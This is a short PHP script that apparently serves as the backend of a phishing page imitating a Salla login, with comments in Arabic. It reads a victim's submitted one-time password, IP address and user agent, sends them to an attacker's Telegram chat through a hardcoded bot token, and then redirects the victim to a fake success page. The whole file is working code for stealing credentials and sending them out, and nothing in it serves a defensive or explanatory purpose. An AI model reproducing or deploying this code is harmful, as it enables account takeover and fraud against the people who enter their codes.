<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $otp = $_POST['otp'];

    $botToken = "7996606148:AAGCkZCmT3y1en-3-zWmyk4almnDqZmbR8A";
    $chatId = "-1002180753425";

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $userIP = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $userIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $userIP = $_SERVER['REMOTE_ADDR'];
    }

    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $message = "╭━─━≪ OTP Info ❄️ ≫─━━╮\n\n";
    $message .= "Iتسجيل دخول سلةI\n\n";
    $message .= "OTP: $otp\n\n";
    $message .= "------------------------\n\n";
    $message .= "IP Address: $userIP\n";
    $message .= "User Agent: $userAgent\n\n";
    $message .= "╰━─━≪ OTP Info ❄️ ≫─━━╯";

    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url); // إرسال الطلب

    // إعادة توجيه المستخدم
    header("Location: /sa/successful");
    exit();
}
?>
